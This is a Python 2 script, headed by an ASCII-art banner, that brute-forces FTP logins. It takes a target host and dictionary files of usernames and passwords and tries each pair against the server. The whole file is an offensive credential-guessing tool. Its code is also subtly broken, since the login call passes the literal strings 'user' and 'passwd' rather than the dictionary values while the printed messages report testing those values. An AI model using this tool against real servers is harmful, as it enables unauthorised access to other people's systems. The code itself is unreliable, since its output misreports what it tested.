print """
     yyyyyyyyyyyyyym     dyyyyyyyyyyyyyyhm  mhhhyyyyyyyhd                   hyyyyyyyyyyyyyh                                                           
    s++++++++++++++    mo++++++++++++++h   d++++++++++++++y                d++++++++++++++d                                                           
   d   s++s       h   hsm     y++h        dm    o++d   ds++o              mm  d+++m      h                                                            
       soos          soooyd  moood              oood     yooh                 dooo                                                                    
       soosddddddm   hsoooom  oood              oood      oy                  doooddddddh   hooh  myosd   hooooooood  dooooooood   dhyoooym  hoohmsosh
       yssssssssh      mhy    sssd              sssm  h   d                   dsssssssss    mssy   hssy  dddmmmhsy   dddmmmhsy   dssd  ysssd  ssshmdsm
       ysss                   sssm              sssmmsssy                     msssd         mssy   hssh       dsm         dsd    sssm  msyhd  ssy     
       hyyh                   yyym              yyy  mdm                      myyy          myyh   yyyh      yh          hh      yyyydm       yyy     
       hym              hm    yyh               yh                            myd            yyy  hhyyh    mym         mym       myyyd        yyh     
  mddddm               dyyd   yd           mm  mm                         ddddm              dyyyymmyyym  dyyyhhddhm  dyyyhhdddm   hyyyhhdm   hyh     
 dhhhm                 hhhhhdm            dhhhd                         mhhhm                  md    dm  mddddddddm  mddddddddm      mmmm     m       
                         dhd              mddm                                                                                                        

"""
import ftplib
def ftplogin(hostname,user,passwd):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('user', 'passwd')
        print '\n[*] ' + str(hostname) +\
        ' FTP Logon Succeeded For User: '+ str(user)+' and password: '+str(passwd)
        ftp.quit()
    except :
        print '\n[-] ' + str(hostname) +\
        ' FTP Logon Failed For User: '+str(user)+' and password: '+str(passwd)
hostname = str(raw_input("Host: "))
user=[]
passwd=[]
print "1.With Username"
print "2.Without Username"
choice = raw_input("> ")
if choice =='1':
    usr_dic=str(raw_input("[*]Enter the user dictionary file: "))
    pass_dic=str(raw_input("[*]Enter the password dictionary file: "))
    usrfile = open(usr_dic,'r')
    passfile = open(pass_dic,'r')
    for line in usrfile.readlines():
        user1 = line.strip('\n')
        user.append(user1)
    for passw in passfile.readlines(): 
            passwd1 = passw.strip('\n')
            passwd.append(passwd1)
    for i in range(0,len(user)):
        for j in range(0,len(passwd)):
            ftplogin(hostname,user[i],passwd[j])
elif choice == '2':
    user = str(raw_input("[*]Enter the username: "))
    pass_dic=str(raw_input("[*]Enter the password dictionary file: "))
    passfile = open(pass_dic,'r')
    for line in passfile.readlines():
        passwd = line.strip('\n')
        ftplogin(hostname,user,passwd)
else :
    print "[-]Please select correct options."